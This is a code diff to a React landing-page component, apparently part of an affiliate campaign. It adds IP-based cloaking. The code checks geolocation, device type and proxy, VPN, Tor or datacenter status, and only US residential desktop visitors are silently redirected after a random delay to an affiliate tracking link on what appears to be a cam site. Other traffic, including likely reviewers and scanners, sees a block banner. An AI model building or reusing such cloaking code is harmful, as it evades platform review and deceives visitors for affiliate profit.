@@ -8,8 +8,8 @@ import Testimonials from './components/Testimonials';
 import Footer from './components/Footer';
 
 const App: React.FC = () => {
-  const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
-  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked'>('checking');
+  const redirectUrl = "https://t.acrsmartcam.com/402888/8873/0?aff_sub5=SF_006OG000004lmDN";
+  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device'>('checking');
   const [allowRedirect, setAllowRedirect] = useState(false);
 
   useEffect(() => {
@@ -26,23 +26,32 @@ const App: React.FC = () => {
         const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
         const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
 
-        if (!isMobile && isUS && !isProxy && !isHosting) {
-          setAllowRedirect(true);
-          setAccessStatus('allowed');
-          
-          // Auto-redirect after random delay (1500ms to 2500ms)
-          const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
-          setTimeout(() => {
-            window.location.href = redirectUrl;
-          }, delay);
-        } else {
+        if (isMobile) {
           setAllowRedirect(false);
-          setAccessStatus('blocked');
+          setAccessStatus('blocked_device');
+          return;
         }
+
+        if (!isUS || isProxy || isHosting) {
+          setAllowRedirect(false);
+          setAccessStatus('blocked_geo');
+          return;
+        }
+
+        // If we reach here, it's US, Desktop, and Residential (not proxy/hosting)
+        setAllowRedirect(true);
+        setAccessStatus('allowed');
+        
+        // Auto-redirect after random delay (1500ms to 2500ms)
+        var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+        setTimeout(function(){
+          window.location.href = redirectUrl;
+        }, delay);
+
       } catch (error) {
         // Fallback: if API fails, we don't allow redirect to be safe
         setAllowRedirect(false);
-        setAccessStatus('blocked');
+        setAccessStatus('blocked_geo');
       }
     };
 
@@ -95,9 +104,14 @@ const App: React.FC = () => {
 
   return (
     <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
-      {accessStatus === 'blocked' && (
+      {accessStatus === 'blocked_geo' && (
         <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
-          Access restricted. Please use a residential US desktop.
+          This content is available for US visitors only.
+        </div>
+      )}
+      {accessStatus === 'blocked_device' && (
+        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
+          Desktop access required to continue.
         </div>
       )}
       
